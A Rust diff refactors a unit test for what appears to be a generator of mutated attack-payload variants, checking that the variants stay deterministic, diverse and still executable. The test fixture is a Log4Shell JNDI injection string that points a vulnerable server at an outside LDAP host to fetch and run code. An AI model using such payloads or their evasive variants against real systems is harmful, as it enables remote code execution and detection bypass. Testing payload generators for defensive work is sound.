@@ -505,20 +505,13 @@ mod tests {
     #[test]
     fn deterministic_diverse_and_all_sound() {
         let atk = "${jndi:ldap://10.0.0.1:1389/Basic/Command/Base64/x}";
-        let a: Vec<_> = generate(atk, &cfg(7))
-            .into_iter()
-            .map(|m| m.payload)
-            .collect();
-        let b: Vec<_> = generate(atk, &cfg(7))
-            .into_iter()
-            .map(|m| m.payload)
-            .collect();
-        assert_eq!(a, b);
-        assert!(a.iter().collect::<std::collections::HashSet<_>>().len() >= 6);
-        for seed in 0..30u64 {
-            for m in generate(atk, &cfg(seed)) {
-                assert!(still_executes(atk, &m.payload), "UNSOUND {:?}", m.payload);
-            }
-        }
+        crate::grammar::equiv::assert_deterministic_diverse_and_sound(
+            generate,
+            atk,
+            &cfg(7),
+            6,
+            still_executes,
+            30,
+        );
     }
 }
